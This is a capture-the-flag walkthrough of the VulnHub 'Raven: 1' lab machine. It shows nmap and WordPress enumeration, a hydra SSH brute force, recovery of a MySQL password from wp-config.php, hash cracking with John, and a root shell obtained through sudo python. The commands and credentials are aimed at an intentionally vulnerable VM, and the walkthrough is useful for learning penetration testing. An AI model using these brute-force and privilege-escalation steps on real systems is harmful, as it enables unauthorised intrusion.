<h1>Raven: 1</h1>

Today we'll be looking at the raven level 1 machine on vulnhub.
You can download the machine [here](https://www.vulnhub.com/entry/raven-1,256/).

Let's scan the machine with nmap.
```┌──(root㉿kali)-[~]
└─# nmap -sS -A 172.16.243.136
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-18 15:45 EET
Nmap scan report for 172.16.243.136
Host is up (0.00019s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 2681c1f35e01ef93493d911eae8b3cfc (DSA)
|   2048 315801194da280a6b90d40981c97aa53 (RSA)
|   256 1f773119deb0e16dca77077684d3a9a0 (ECDSA)
|_  256 0e8571a8a2c308699c91c03f8418dfae (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Raven Security
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          46310/udp6  status
|   100024  1          47722/udp   status
|   100024  1          57040/tcp   status
|_  100024  1          60827/tcp6  status
MAC Address: 00:0C:29:28:78:D7 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.19 ms 172.16.243.136

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.98 seconds
```

Let's use dirsearch.

```dirsearch -u 172.16.243.136```

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/raven1/pics/pic1.png)

We can see that the machine is running wordpress.

Let's try to enumerate usernames.

```wpscan --url http://172.16.243.136/wordpress -e u```

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/raven1/pics/pic2.png)

Let's brute force the login to get the password.

I tried to brute force the wordpress login but I couldn't get the password.

So I tried to brute force ssh login.

```hydra -l michael -P /usr/share/wordlists/rockyou.txt 172.16.243.136 ssh -V -I```

We got the password for michael.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/raven1/pics/pic3.png)

Now, let's login as michael.

Now, let's begin looking for the flags.

Remember, there are four flags hidden in the machine.

I first went to /var/www/html and found the flag using grep.

```grep -r "flag"```

We got the first flag!

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/raven1/pics/pic4.png)

Then I went one step back and found the second flag in /var/www

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/raven1/pics/pic5.png)

After that I went to check the wp-config.php file.

And I found the password for the mysql.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/raven1/pics/pic6.png)

Now, let's login.

```mysql -u root -p'R@v3nSecurity'```

We got in!

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/raven1/pics/pic7.png)

Now, let's explore the databases.

```show databases;```

```use wordpress;```

```show tables;```

```select * from wp_users;```

We found the hashed password for steven.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/raven1/pics/pic8.png)

Let's crack the hash using JohnTheRipper.

```john --wordlist=/usr/share/wordlist/rockyou.txt hash.txt```

We got the password **pink84**.

I also found the third flag in the wp_posts table.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/raven1/pics/pic9.png)

Let's switch to steven

Let's run sudo -l

Great! we can run python with sudo.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/raven1/pics/pic10.png)

```sudo python -c 'import os; os.system("/bin/sh")'```

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/raven1/pics/pic11.png)